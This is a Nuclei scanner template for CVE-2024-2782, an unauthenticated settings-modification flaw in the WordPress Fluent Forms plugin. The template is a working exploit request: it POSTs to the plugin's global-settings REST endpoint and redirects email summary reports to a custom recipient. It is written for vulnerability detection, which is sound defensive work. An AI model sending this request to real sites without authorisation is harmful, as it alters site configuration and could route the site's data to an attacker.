id: CVE-2024-2782

info:
  name: WordPress Fluent Forms Unauthenticated Settings Modification
  author: pdteam
  severity: medium
  description: |
    WordPress Contact Form Plugin by Fluent Forms versions up to and including 5.1.16 are vulnerable to
    unauthenticated data modification due to missing capability checks on the REST API endpoint.
    This allows attackers to modify plugin settings without authentication.
  reference:
    - https://github.com/whale93/CVE-2024-2782-PoC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-2782
    cwe-id: CWE-862
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2024,wordpress,fluent-forms,unauth,rest-api

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/fluentform/v1/global-settings"

    matchers:
      - type: word
        words:
          - "fluentform"
          - "settings"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/wp-json/fluentform/v1/global-settings"

    headers:
      Content-Type: application/json

    body: |
      {
        "key": "emailSummarySettings", 
        "email_report": "{\"send_to_type\":\"custom\",\"custom_recipients\":\"test@nuclei.local\"}"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "fluentform"
          - "success"
        condition: or

      - type: word
        words:
          - "test@nuclei.local"
        part: body

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"version":"([0-9.]+)"'